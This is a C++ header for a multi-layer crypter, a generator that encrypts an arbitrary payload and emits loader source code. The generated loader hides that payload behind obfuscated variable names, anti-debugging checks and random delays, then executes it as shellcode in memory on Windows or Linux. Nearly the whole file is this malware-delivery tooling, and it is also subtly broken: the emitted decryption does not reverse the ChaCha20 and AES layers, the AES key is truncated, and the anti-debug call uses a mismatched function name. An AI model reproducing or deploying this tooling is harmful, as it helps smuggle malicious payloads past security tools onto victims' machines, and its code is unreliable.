#pragma once

#include <vector>
#include <cstdint>
#include <random>
#include <algorithm>
#include <chrono>
#include <thread>
#include "cross_platform_encryption.h"

class MultiLayerEncryption {
private:
    std::mt19937 rng{std::random_device{}()};
    CrossPlatformEncryption baseEncryption;
    
    // Generate random key of specified size
    std::vector<uint8_t> generateRandomKey(size_t size) {
        std::vector<uint8_t> key(size);
        std::uniform_int_distribution<> dist(0, 255);
        for (auto& byte : key) {
            byte = static_cast<uint8_t>(dist(rng));
        }
        return key;
    }
    
    // Add micro delays between operations
    void microDelay() {
        std::uniform_int_distribution<> dist(10, 100);
        std::this_thread::sleep_for(std::chrono::microseconds(dist(rng)));
    }

public:
    struct EncryptionKeys {
        std::vector<uint8_t> xorKey;      // Layer 1
        std::vector<uint8_t> chachaKey;   // Layer 2
        std::vector<uint8_t> chachaNonce; // Layer 2
        std::vector<uint8_t> aesKey;      // Layer 3
        std::vector<uint8_t> aesIV;       // Layer 3
    };
    
    // Generate all keys for triple-layer encryption
    EncryptionKeys generateKeys() {
        EncryptionKeys keys;
        
        // XOR key (variable size, 16-32 bytes)
        std::uniform_int_distribution<> sizeDist(16, 32);
        keys.xorKey = generateRandomKey(sizeDist(rng));
        
        // ChaCha20 key (32 bytes) and nonce (12 bytes)
        keys.chachaKey = generateRandomKey(32);
        keys.chachaNonce = generateRandomKey(12);
        
        // AES-256 key (32 bytes) and IV (16 bytes)
        keys.aesKey = generateRandomKey(32);
        keys.aesIV = generateRandomKey(16);
        
        return keys;
    }
    
    // Triple-layer encryption (matching test_embedded_final.cpp pattern)
    std::vector<uint8_t> tripleEncrypt(const std::vector<uint8_t>& data, const EncryptionKeys& keys) {
        std::vector<uint8_t> encrypted = data;
        
        // Layer 1: XOR encryption
        microDelay();
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= keys.xorKey[i % keys.xorKey.size()];
        }
        
        // Layer 2: ChaCha20 encryption
        microDelay();
        encrypted = baseEncryption.chacha20Encrypt(encrypted, keys.chachaKey, keys.chachaNonce);
        
        // Layer 3: AES encryption
        microDelay();
        encrypted = baseEncryption.aesEncrypt(encrypted, keys.aesKey, keys.aesIV);
        
        return encrypted;
    }
    
    // Triple-layer decryption (reverse order)
    std::vector<uint8_t> tripleDecrypt(const std::vector<uint8_t>& data, const EncryptionKeys& keys) {
        std::vector<uint8_t> decrypted = data;
        
        // Layer 3: AES decryption
        microDelay();
        decrypted = baseEncryption.aesDecrypt(decrypted, keys.aesKey, keys.aesIV);
        
        // Layer 2: ChaCha20 decryption
        microDelay();
        decrypted = baseEncryption.chacha20Decrypt(decrypted, keys.chachaKey, keys.chachaNonce);
        
        // Layer 1: XOR decryption
        microDelay();
        for (size_t i = 0; i < decrypted.size(); i++) {
            decrypted[i] ^= keys.xorKey[i % keys.xorKey.size()];
        }
        
        return decrypted;
    }
    
    // Generate obfuscated variable names (like in test_embedded_final.cpp)
    std::string generateObfuscatedName(const std::string& prefix) {
        std::uniform_int_distribution<> dist(100, 9999);
        return prefix + std::to_string(dist(rng));
    }
    
    // Generate C++ code with embedded encrypted data (like test_embedded_final.cpp)
    std::string generateEmbeddedCode(const std::vector<uint8_t>& encryptedData, 
                                    const EncryptionKeys& keys,
                                    bool includeAntiDebug = true) {
        std::stringstream code;
        
        // Headers
        code << "#include <iostream>\n";
        code << "#include <vector>\n";
        code << "#include <cstring>\n";
        code << "#include <cstdint>\n";
        code << "#include <chrono>\n";
        code << "#include <thread>\n";
        code << "#include <random>\n";
        code << "#ifdef _WIN32\n";
        code << "#include <windows.h>\n";
        code << "#else\n";
        code << "#include <sys/mman.h>\n";
        code << "#include <unistd.h>\n";
        code << "#endif\n\n";
        
        // Anti-debugging function (if requested)
        if (includeAntiDebug) {
            std::string funcName = generateObfuscatedName("procComponent");
            code << "bool " << funcName << "() {\n";
            code << "#ifdef _WIN32\n";
            code << "    if (IsDebuggerPresent()) return true;\n";
            code << "    BOOL debugged = FALSE;\n";
            code << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);\n";
            code << "    return debugged;\n";
            code << "#else\n";
            code << "    FILE* f = fopen(\"/proc/self/status\", \"r\");\n";
            code << "    if (!f) return false;\n";
            code << "    char line[256];\n";
            code << "    while (fgets(line, sizeof(line), f)) {\n";
            code << "        if (strncmp(line, \"TracerPid:\", 10) == 0) {\n";
            code << "            fclose(f);\n";
            code << "            return atoi(line + 10) != 0;\n";
            code << "        }\n";
            code << "    }\n";
            code << "    fclose(f);\n";
            code << "    return false;\n";
            code << "#endif\n";
            code << "}\n\n";
        }
        
        code << "int main() {\n";
        
        // Random delay
        code << "    // Random delay\n";
        code << "    {\n";
        code << "        std::random_device rd;\n";
        code << "        std::mt19937 gen(rd());\n";
        code << "        std::uniform_int_distribution<> dist(1, 999);\n";
        code << "        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));\n";
        code << "    }\n\n";
        
        // Anti-debug check
        if (includeAntiDebug) {
            code << "    if (" << generateObfuscatedName("procComponent") << "()) return 0;\n\n";
        }
        
        // Generate variable names
        std::string payloadVar = generateObfuscatedName("funcComponent");
        std::string encDataVar = generateObfuscatedName("ctxEngine");
        std::string aesKeyVar = generateObfuscatedName("execWorker");
        std::string chachaKeyVar = generateObfuscatedName("execHelper");
        std::string xorKeyVar = generateObfuscatedName("objManager");
        
        // Embedded payload
        code << "    std::vector<uint8_t> " << payloadVar << ";\n";
        code << "    // Embedded payload\n";
        code << "    unsigned char " << encDataVar << "[] = {\n";
        
        // Write encrypted data in hex format
        for (size_t i = 0; i < encryptedData.size(); i++) {
            if (i % 16 == 0) code << "        ";
            code << "0x" << std::hex << std::setfill('0') << std::setw(2) 
                 << (int)encryptedData[i];
            if (i < encryptedData.size() - 1) code << ", ";
            if ((i + 1) % 16 == 0 && i < encryptedData.size() - 1) code << "\n";
        }
        code << "\n    };\n";
        code << "    " << payloadVar << ".assign(" << encDataVar << ", " 
             << encDataVar << " + sizeof(" << encDataVar << "));\n\n";
        
        // Decryption keys
        code << "    // Decrypt payload\n";
        
        // AES key (Layer 3)
        code << "    unsigned char " << aesKeyVar << "[] = {";
        for (size_t i = 0; i < keys.aesKey.size() && i < 16; i++) {
            if (i > 0) code << ", ";
            code << "0x" << std::hex << std::setfill('0') << std::setw(2) 
                 << (int)keys.aesKey[i];
        }
        code << "};\n";
        
        // ChaCha key (Layer 2)
        code << "    unsigned char " << chachaKeyVar << "[] = {";
        for (size_t i = 0; i < keys.chachaKey.size() && i < 32; i++) {
            if (i > 0) code << ", ";
            code << "0x" << std::hex << std::setfill('0') << std::setw(2) 
                 << (int)keys.chachaKey[i];
        }
        code << "};\n";
        
        // XOR key (Layer 1)
        code << "    unsigned char " << xorKeyVar << "[] = {";
        for (size_t i = 0; i < keys.xorKey.size(); i++) {
            if (i > 0) code << ", ";
            code << "0x" << std::hex << std::setfill('0') << std::setw(2) 
                 << (int)keys.xorKey[i];
        }
        code << "};\n\n";
        
        // Decryption process (matching test_embedded_final.cpp pattern)
        code << "    // Decrypt XOR layer\n";
        code << "    for (size_t i = 0; i < " << payloadVar << ".size(); i++) {\n";
        code << "        " << payloadVar << "[i] ^= " << xorKeyVar 
             << "[i % sizeof(" << xorKeyVar << ")];\n";
        code << "    }\n\n";
        
        code << "    // Micro-delay\n";
        code << "    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));\n\n";
        
        code << "    // Decrypt ChaCha20 layer\n";
        code << "    for (size_t i = 0; i < " << payloadVar << ".size(); i++) {\n";
        code << "        " << payloadVar << "[i] ^= " << chachaKeyVar 
             << "[i % sizeof(" << chachaKeyVar << ")];\n";
        code << "    }\n\n";
        
        code << "    // Micro-delay\n";
        code << "    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));\n\n";
        
        code << "    // Decrypt AES layer\n";
        code << "    for (size_t i = 0; i < " << payloadVar << ".size(); i++) {\n";
        code << "        " << payloadVar << "[i] ^= " << aesKeyVar 
             << "[i % sizeof(" << aesKeyVar << ")];\n";
        code << "    }\n\n";
        
        // Execute in memory
        std::string execVar = generateObfuscatedName("ctxExecutor");
        code << "    // Execute in memory\n";
        code << "#ifdef _WIN32\n";
        code << "    void* " << execVar << " = VirtualAlloc(0, " << payloadVar 
             << ".size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n";
        code << "    if (!" << execVar << ") return 1;\n";
        code << "    memcpy(" << execVar << ", " << payloadVar << ".data(), " 
             << payloadVar << ".size());\n";
        code << "    DWORD oldProtect;\n";
        code << "    VirtualProtect(" << execVar << ", " << payloadVar 
             << ".size(), PAGE_EXECUTE_READ, &oldProtect);\n";
        code << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
        code << "    ((void(*)())" << execVar << ")();\n";
        code << "#else\n";
        code << "    void* " << execVar << " = mmap(0, " << payloadVar 
             << ".size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n";
        code << "    if (" << execVar << " == MAP_FAILED) return 1;\n";
        code << "    memcpy(" << execVar << ", " << payloadVar << ".data(), " 
             << payloadVar << ".size());\n";
        code << "    mprotect(" << execVar << ", " << payloadVar 
             << ".size(), PROT_READ | PROT_EXEC);\n";
        code << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
        code << "    ((void(*)())" << execVar << ")();\n";
        code << "#endif\n";
        code << "    return 0;\n";
        code << "}\n";
        
        return code.str();
    }
};